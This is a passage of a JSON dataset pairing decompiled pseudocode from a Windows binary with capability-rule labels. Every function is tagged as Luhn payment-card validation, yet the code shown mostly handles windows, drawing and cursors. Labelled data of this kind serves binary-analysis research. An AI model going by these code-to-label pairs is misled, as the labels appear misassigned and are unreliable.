            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00438704(void)\n\n{\n    int32_t *arg_8h;\n    char extraout_DL;\n    \n    arg_8h = fcn.004035e4();\n    fcn.00458244();\n    if ((arg_8h[0x28] == 0) || ((*(arg_8h[0x28] + 0x1c) & 8) != 0)) {\n        (**(*arg_8h + 0x68))();\n    }\n    else {\n        fcn.0043a6d4(arg_8h);\n        (**(*arg_8h + 0x68))();\n        fcn.00438ecc();\n        fcn.00403454();\n        arg_8h[0x28] = 0;\n    }\n    fcn.00403258();\n    arg_8h[0x1b] = 0;\n    fcn.00403258();\n    fcn.00403258();\n    fcn.00408828();\n    fcn.00419568();\n    if ('\\0' < extraout_DL) {\n        fcn.004035cc();\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "00438ecc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438ecc(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *(in_EAX + 0x40);\n    param_2[1] = *(in_EAX + 0x44);\n    param_2[2] = *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    param_2[3] = *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    return;\n}\n",
        "token_count": 128
    },
    "00438f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00438f30(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack12;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack12;\n}\n",
        "token_count": 48
    },
    "00438f48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00438f48(void)\n\n{\n    fcn.00438f74();\n    fcn.00412708();\n    fcn.004393b8();\n    return;\n}\n",
        "token_count": 42
    },
    "00438f74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00438f74(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack8;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack8;\n}\n",
        "token_count": 48
    },
    "00438f8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00438f8c(void)\n\n{\n    fcn.00438f30();\n    fcn.00412708();\n    fcn.004393b8();\n    return;\n}\n",
        "token_count": 43
    },
    "00439044": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439044(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 + iStack20;\n    param_1[1] = param_2[1] + iStack16;\n    return;\n}\n",
        "token_count": 104
    },
    "00439070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439070(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 - iStack20;\n    param_1[1] = param_2[1] - iStack16;\n    return;\n}\n",
        "token_count": 104
    },
    "004393b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004393b8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iVar1 = *param_2;\n    iVar2 = param_2[1];\n    (**(*in_EAX + 0x44))(iVar1, iVar2);\n    (**(*in_EAX + 0x84))((in_EAX[0x13] - iStack16) + iVar2, (in_EAX[0x12] - iStack20) + iVar1);\n    return;\n}\n",
        "token_count": 154
    },
    "0043a400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.0043a400(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar auStack28 [16];\n    \n    uVar3 = *param_2;\n    uVar4 = param_2[1];\n    uVar5 = param_2[2];\n    uVar6 = param_2[3];\n    if (*(in_EAX + 0xa0) != 0) {\n        cVar1 = fcn.00403454(uVar3, uVar4, uVar5, uVar6);\n        if (cVar1 == '\\0') {\n            cVar1 = '\\0';\n            goto code_r0x0043a434;\n        }\n    }\n    cVar1 = '\\x01';\ncode_r0x0043a434:\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.0043b284();\n        if (iVar2 == 0) {\n            fcn.00403454(uVar3, uVar4, uVar5, uVar6);\n        }\n        else {\n            uVar3 = fcn.00438f74();\n            arg_8h = auStack28;\n            fcn.00438f30();\n            fcn.00412730(arg_8h, uVar3);\n            fcn.00403454();\n        }\n    }\n    return cVar1;\n}\n",
        "token_count": 352
    },
    "0043a5a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043a5a0(uint param_1, int32_t param_2)\n\n{\n    uint uStack16;\n    \n    sub.user32.dll_GetCursorPos();\n    fcn.00439070();\n    *param_2 = param_2;\n    *(param_2 + 4) = uStack16;\n    return;\n}\n",
        "token_count": 78
    },
    "0043a6d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043a6d4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        (**(in_EAX + 0x38))();\n    }\n    return 0;\n}\n",
        "token_count": 87
    },
    "0043aa0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043aa0c(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x43a9d0;\n    fcn.0043a9dc(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1);\n    return;\n}\n",
        "token_count": 94
    },
    "0043ab20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ab20(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        if ((*(in_EAX + 0x48) < 0x8001) && (*(in_EAX + 0x4c) < 0x8001)) {\n            fcn.00450574(*(in_EDX + 10), *(in_EDX + 8));\n            fcn.00403454();\n        }\n        else {\n            fcn.0043a5a0();\n            fcn.00450574(var_4h, var_8h);\n            fcn.00403454();\n        }\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0043b284": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043b284(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**(*in_EAX + 0x58))(*param_2, param_2[1], param_2[2], param_2[3]);\n    if (iVar1 != 0) {\n        iVar1 = (**(*in_EAX + 0x58))();\n        iVar2 = fcn.004031a0();\n        if (iVar1 != iVar2) {\n            iVar1 = (**(*in_EAX + 0x58))();\n            uVar3 = (**(iVar1 + 0x2c))();\n            fcn.00438cc0();\n            fcn.00438c9c();\n            fcn.00438f48();\n            fcn.00438f8c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 229
    },
    "0043b6c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043b6c0(uint param_1, int32_t param_2)\n\n{\n    double *in_EAX;\n    double *pdVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < param_2) {\n        iVar3 = 1;\n        pdVar1 = in_EAX;\n        do {\n            pdVar1 = pdVar1 + 1;\n            if (*pdVar1 < in_EAX[iVar2]) {\n                iVar2 = iVar3;\n            }\n            iVar3 = iVar3 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 176
    },
    "0043ba34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043ba34(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar2;\n    code *pcStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack40 = 0x43ba4d;\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    uStack44 = 0x43bb2c;\n    pcStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &fcn.0043ba34::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.0043862c();\n    pcVar2 = fcn.0043d4c4;\n    uVar1 = fcn.0041a5ac(fcn.0043d4c4, in_EAX);\n    *(in_EAX + 0x18c) = uVar1;\n    uVar1 = fcn.0041cf14();\n    *(in_EAX + 0x170) = uVar1;\n    fcn.0041d0bc();\n    *(in_EAX + 0x1a9) = 1;\n    *(in_EAX + 0x1a0) = 0xffffffff;\n    *(in_EAX + 0x184) = 3;\n    if (*(*0x462210 + 4) == 0x11) {\n        fcn.00403fa8();\n    }\n    else {\n        fcn.00457344();\n        fcn.00403ffc();\n    }\n    *(in_EAX + 0x1a7) = 0;\n    *(in_EAX + 0x162) = *0x43bb54;\n    *(in_EAX + 0x163) = 2;\n    *(in_EAX + 0x164) = 1;\n    *(in_EAX + 0x168) = 1;\n    *(in_EAX + 0x150) = 1;\n    *in_FS_OFFSET = pcVar2;\n    pcStack48 = 0x43bb33;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 576
    },
    "0043c5d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043c5d0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00403228();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.00438f30();\n    iVar2 = fcn.0043ca38();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0043c9fc();\n            if (*(iVar3 + 4) == *(in_EAX + 4)) {\n                fcn.0043c9fc();\n                fcn.00413a08();\n                fcn.00438c9c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar1 = *(iVar1 + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00413b64();\n            fcn.0043a6d4(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 337
    },
    "0043ca38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043ca38(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (*(in_EAX + 0x198) != 0) {\n        iVar1 = *(*(in_EAX + 0x198) + 8);\n    }\n    if (*(in_EAX + 0x19c) != 0) {\n        iVar1 = iVar1 + *(*(in_EAX + 0x19c) + 8);\n    }\n    return iVar1;\n}\n",
        "token_count": 124
    },
    "0043ca98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ca98(uint param_1, ushort param_2)\n\n{\n    fcn.0043ca58(param_2, 0, 0, 0);\n    return;\n}\n",
        "token_count": 47
    },
    "0043d048": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d048(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0043aa0c();\n    uVar2 = 0x43ced0;\n    uVar1 = 0x43cf08;\n    uVar3 = in_EAX;\n    fcn.0043cf70(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 151
    },
    "0043d244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d244(uint arg_8h)\n\n{\n    uint var_10h;\n    \n    return;\n}\n",
        "token_count": 30
    },
    "0043d988": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0043d988(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.004363b8();\n    if (iVar1 != 0) {\n        uVar2 = fcn.0043a6d4(*(param_2 + 8));\n        *(param_2 + 0xc) = uVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 108
    },
    "0043f6f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f6f4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_10h;\n    \n    if ((((in_EDX == *(in_EAX + 0x40)) && (in_ECX == *(in_EAX + 0x44))) && (arg_ch == *(in_EAX + 0x48))) &&\n       (arg_8h == *(in_EAX + 0x4c))) {\n        return;\n    }\n    cVar1 = fcn.0044000c();\n    if ((cVar1 == '\\0') || (iVar2 = sub.user32.dll_IsIconic(*(in_EAX + 0x180)),  iVar2 != 0)) {\n        *(in_EAX + 0x40) = in_EDX;\n        *(in_EAX + 0x44) = in_ECX;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x4c) = arg_8h;\n        cVar1 = fcn.0044000c();\n        if (cVar1 != '\\0') {\n            var_2ch = 0x2c;\n            sub.user32.dll_GetWindowPlacement(*(in_EAX + 0x180), &var_2ch);\n            fcn.00438ecc();\n            sub.user32.dll_SetWindowPlacement();\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowPos(*(in_EAX + 0x180), 0);\n    }\n    fcn.00438b80();\n    fcn.00403454();\n    return;\n}\n",
        "token_count": 406
    },
    "0043f7cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f7cc(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043ca38(param_2, param_1);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0043c9fc();\n            fcn.00403454();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0043fc10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043fc10(void)\n\n{\n    int32_t in_EAX;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    uStack24 = 0x43fc1f;\n    fcn.00438ecc();\n    uStack24 = 1;\n    uStack28 = 1;\n    sub.user32.dll_InflateRect();\n    sub.user32.dll_InvalidateRect(*(*(in_EAX + 0x30) + 0x180), &stack0xffffffe0, 0xffffffff);\n    return;\n}\n",
        "token_count": 145
    },
    "00440018": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00440018(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack76 = *(in_EAX + 0x180);\n    puStack80 = 0x44002c;\n    iVar1 = sub.user32.dll_IsIconic();\n    if (iVar1 == 0) {\n        uStack84 = *(in_EAX + 0x180);\n        uStack88 = 0x440062;\n        puStack80 = &stack0xffffffb4;\n        sub.user32.dll_GetWindowRect();\n    }\n    else {\n        uStack60 = 0x2c;\n        puStack80 = &stack0xffffffc4;\n        uStack84 = *(in_EAX + 0x180);\n        uStack88 = 0x440049;\n        sub.user32.dll_GetWindowPlacement();\n        uStack84 = uStack40;\n        puStack80 = puStack36;\n        uStack76 = uStack32;\n        uStack72 = uStack28;\n    }\n    uStack88 = 0xfffffff0;\n    uStack92 = *(in_EAX + 0x180);\n    uStack96 = 0x440070;\n    uVar2 = sub.user32.dll_GetWindowLongA();\n    if ((uVar2 & 0x40000000) != 0) {\n        uStack96 = 0xfffffff8;\n        uStack100 = *(in_EAX + 0x180);\n        puStack104 = 0x440085;\n        iVar1 = sub.user32.dll_GetWindowLongA();\n        if (iVar1 != 0) {\n            sub.user32.dll_ScreenToClient();\n            sub.user32.dll_ScreenToClient();\n            iStack116 = iVar1;\n            puStack112 = &stack0xffffff9c;\n            iStack108 = iVar1;\n            puStack104 = &stack0xffffff9c;\n        }\n    }\n    *(in_EAX + 0x40) = iStack116;\n    *(in_EAX + 0x44) = puStack112;\n    *(in_EAX + 0x48) = iStack108 - iStack116;\n    *(in_EAX + 0x4c) = puStack104 - puStack112;\n    fcn.00438b80();\n    return;\n}\n",
        "token_count": 622
    },
    "004402ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004402ac(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0043ca38();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0043c9fc();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "004410bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004410bc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack16 = 0x4410cd;\n    var_4h = in_EAX;\n    uStack16 = fcn.0043fd08();\n    puStack20 = 0x4410d3;\n    var_8h = sub.user32.dll_GetWindowDC();\n    uStack24 = 0x441112;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xcc))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x441119;\n    uStack24 = var_8h;\n    uStack28 = 0x44110b;\n    uStack28 = fcn.0043fd08();\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 258
    },
    "00441120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00441120(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x4411b9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    (**(*in_EAX + 0x44))();\n    var_10h = var_10h + 2;\n    var_ch = var_ch + 2;\n    fcn.0041c8f0();\n    uVar1 = fcn.0043b840();\n    fcn.0043952c(0xffffffff, &var_10h, uVar1 | 0x810);\n    uVar2 = fcn.00404468();\n    uVar2 = fcn.0041d804(uVar2);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar2;\n    fcn.00403fa8(0x4411c0);\n    return;\n}\n",
        "token_count": 284
    },
    "004414b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004414b4(void)\n\n{\n    int32_t *in_EAX;\n    uint var_10h;\n    \n    (**(*in_EAX + 0xd0))();\n    return;\n}\n",
        "token_count": 46
    },
    "004414dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004414dc(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.00412730(arg_8h, 0);\n    uVar1 = fcn.0043b840();\n    uVar2 = fcn.00404468(0xffffffff, arg_8h, uVar1 | 0xc10);\n    uVar2 = fcn.0041d804(uVar2);\n    sub.user32.dll_DrawTextA(uVar2);\n    *(arg_8h + 8) = *(arg_8h + 8) + 6;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 2;\n    return;\n}\n",
        "token_count": 180
    },
    "004415c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004415c8(int32_t *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t lpRect;\n    int32_t var_14h;\n    uint lpPoint;\n    uint var_4h;\n    \n    sub.user32.dll_ClientToScreen();\n    sub.user32.dll_GetWindowRect();\n    *arg_8h = in_EDX - lpRect;\n    arg_8h[1] = in_ECX - var_14h;\n    return;\n}\n",
        "token_count": 120
    },
    "00441620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00441620(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint dxHotspot;\n    uint dyHotspot;\n    uint himlDrag;\n    \n    if (*(in_EAX + 0x68) != -1) {\n        uStack24 = 1;\n        uStack28 = 1;\n        uStack32 = 1;\n        uStack36 = 0xe;\n        uStack40 = 0x441645;\n        uStack40 = (***0x461f44)();\n        uStack44 = 0xd;\n        uStack48 = 0x441651;\n        uStack48 = (***0x461f44)();\n        puStack52 = 0x441657;\n        himlDrag = sub.comctl32.dll_ImageList_Create();\n        uStack56 = 0x4416e0;\n        uStack60 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc4;\n        puStack52 = &stack0xfffffffc;\n        fcn.004573cc();\n        fcn.004240b0();\n        fcn.004573cc();\n        fcn.004240b0();\n        sub.comctl32.dll_ImageList_SetDragCursorImage(himlDrag, 0, 0, 0);\n        sub.comctl32.dll_ImageList_GetDragImage(0, &fcn.00441620::dxHotspot);\n        uVar1 = himlDrag;\n        sub.comctl32.dll_ImageList_SetDragCursorImage(himlDrag, 1, dxHotspot, dyHotspot);\n        *in_FS_OFFSET = uVar1;\n        sub.comctl32.dll_ImageList_Destroy(himlDrag, 0x4416e7);\n        return;\n    }\n    return;\n}\n",
        "token_count": 454
    },
    "00441ab8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441ab8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "00442e1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442e1c(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    int32_t in_EDX;\n    uint *arg_8h_00;\n    uint uVar1;\n    uint uVar2;\n    uint var_10h;\n    \n    uVar2 = 0;\n    uVar1 = 1;\n    arg_ch = *(*(arg_8h + -8) + 0x18) + in_EDX + -2;\n    arg_8h_00 = &var_10h;\n    fcn.00412730(arg_8h_00, arg_ch);\n    uVar1 = fcn.0041d804(&var_10h, arg_8h_00, arg_ch, uVar1, uVar2);\n    sub.user32.dll_DrawFrameControl(uVar1);\n    return;\n}\n",
        "token_count": 193
    },
    "00443788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443788(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x443837;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(**(arg_8h + -4) + 0x10))();\n    (**(**(arg_8h + -4) + 0x10))();\n    (**(**(arg_8h + -4) + 0x10))();\n    arg_8h_00 = arg_8h;\n    fcn.00441d94();\n    fcn.00443710(arg_8h_00);\n    if (*(in_EAX + 8) != 0) {\n        fcn.00443788(arg_8h);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.00443788(arg_8h);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x44383e;\n    uStack28 = 0x443836;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 322
    },
    "00443a88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443a88(uint *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *(in_EAX + 0x60) = param_2;\n    fcn.0043fd08(uVar1, uVar2);\n    fcn.004445e8();\n    uVar1 = fcn.0043fd08();\n    *(in_EAX + 0x5c) = uVar1;\n    uVar3 = 0;\n    uVar2 = sub.user32.dll_GetDCEx(uVar1, 0, 0x412);\n    *(in_EAX + 0x58) = uVar2;\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x54) = uVar3;\n    fcn.00443b9c();\n    return;\n}\n",
        "token_count": 236
    },
    "00443d18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00443d18(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        var_8h = fcn.00442004();\n        iVar1 = fcn.00441b88();\n        var_8h = var_8h + iVar1;\n    }\n    else {\n        var_8h = fcn.00442004();\n    }\n    fcn.00443c88(&stack0xfffffffc);\n    return var_8h;\n}\n",
